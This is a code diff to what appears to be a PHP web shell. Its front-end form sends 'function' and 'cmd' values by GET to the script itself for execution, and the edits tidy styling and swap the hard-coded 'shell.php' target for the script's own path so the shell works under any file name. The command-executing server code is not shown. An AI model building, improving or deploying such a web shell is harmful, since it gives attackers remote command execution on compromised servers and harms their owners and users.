@@ -16,7 +16,7 @@ if($_GET["function"]) {
 </style>
 <form id="mainform">
 	<div style="width: 50%; height: 100%; float: left; box-sizing: border-box;">
-		<textarea style="width: 100%;     height: 100%;" id="results"></textarea>
+		<textarea style="width: 100%; height: 100%;" id="results"></textarea>
 	</div>
 	<div style="width: 50%; float: left; padding: 10px;">
 		Function<br/>
@@ -72,7 +72,7 @@ function loadDoc() {
      document.getElementById('results').scrollTop = document.getElementById('results').scrollHeight;
     }
   };
-  xhttp.open("GET", "shell.php?function="+encodeURIComponent(document.getElementById('function').value)+"&cmd="+encodeURIComponent(document.getElementById('cmd').value), true);
+  xhttp.open("GET", "<?php echo __FILE__; ?>?function="+encodeURIComponent(document.getElementById('function').value)+"&cmd="+encodeURIComponent(document.getElementById('cmd').value), true);
   xhttp.send();
 }
 </script>
